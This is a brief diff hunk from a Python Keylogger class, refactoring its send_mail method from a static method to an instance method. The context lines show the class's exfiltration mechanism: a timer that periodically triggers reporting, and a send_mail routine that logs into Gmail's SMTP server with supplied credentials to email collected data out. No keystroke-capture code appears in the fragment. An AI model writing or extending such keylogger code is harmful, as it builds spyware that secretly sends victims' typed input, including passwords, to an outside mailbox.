@@ -29,8 +29,7 @@ class Keylogger:
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
-    @staticmethod
-    def send_mail(email, password, message):
+    def send_mail(self, email, password, message):
         """Send email smtp.google.com"""
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.set_debuglevel(False)
